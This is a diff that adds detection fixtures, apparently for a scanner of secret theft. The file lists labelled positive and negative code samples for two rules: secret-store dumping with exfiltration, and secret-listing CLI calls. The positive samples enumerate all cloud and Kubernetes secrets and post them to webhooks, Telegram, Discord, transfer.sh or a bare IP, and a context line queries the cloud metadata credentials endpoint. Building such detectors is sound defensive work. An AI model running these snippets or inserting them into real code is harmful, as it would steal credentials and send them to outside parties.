@@ -107,5 +107,47 @@
         "resp, _ := http.Get(\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\")\nall := os.Environ()"
       ]
     ]
+  },
+  "exfiltration/secret-store-dump": {
+    "lang": "js",
+    "pos": [
+      "const { SecretList } = await sm.send(new ListSecretsCommand({}));\nfor (const s of SecretList) out.push(await sm.send(new GetSecretValueCommand({ SecretId: s.ARN })));\nawait fetch('https://webhook.site/0000-example', { method: 'POST', body: JSON.stringify(out) });",
+      "const res = await fetch(`https://${host}/api/v1/secrets`, { headers: { Authorization: `Bearer ${sa}` } });\nawait post('https://api.telegram.org/bot0:example/sendDocument', await res.text());"
+    ],
+    "neg": [
+      "export class ListSecretsCommand extends Command {}\nexport class GetSecretValueCommand extends Command {}\nconst endpoint = `https://secretsmanager.${region}.amazonaws.com`;",
+      "listSecretForAllNamespaces() { return this.request('GET', '/api/v1/secrets'); }\nreadNamespacedSecret(name, ns) { return this.request('GET', `/api/v1/namespaces/${ns}/secrets/${name}`); }",
+      "const v = await sm.send(new GetSecretValueCommand({ SecretId: 'app/db' }));\nawait fetch('https://hooks.slack.com/services/T0/B0/example', { body: 'deployed' });"
+    ],
+    "also": [
+      [
+        "py",
+        "names = [s['Name'] for s in sm.list_secrets()['SecretList']]\nvals = {n: sm.get_secret_value(SecretId=n)['SecretString'] for n in names}\nrequests.post('http://203.0.113.9/c', json=vals)"
+      ],
+      [
+        "go",
+        "it := client.ListSecrets(ctx, req)\nv, _ := client.AccessSecretVersion(ctx, acc)\nhttp.Post(\"https://discord.com/api/webhooks/1/example\", \"text/plain\", body)"
+      ],
+      [
+        "sh",
+        "for k in $(vault kv list -format=json secret/); do vault kv get secret/$k; done > s.txt\ncurl --upload-file s.txt https://transfer.sh/s.txt"
+      ]
+    ]
+  },
+  "secrets-fs/secret-store-cli": {
+    "lang": "js",
+    "pos": [
+      "const all = execSync('kubectl get secrets -A -o json').toString();",
+      "const out = execSync('aws secretsmanager list-secrets --output json').toString();"
+    ],
+    "neg": [
+      "execSync('kubectl get pods -A');",
+      "const status = execSync('vault status').toString();",
+      "execSync('aws secretsmanager create-secret --name app');"
+    ],
+    "also": [
+      ["py", "out = subprocess.check_output('gcloud secrets list --format=json', shell=True)"],
+      ["sh", "az keyvault secret list --vault-name kv -o json"]
+    ]
   }
 }
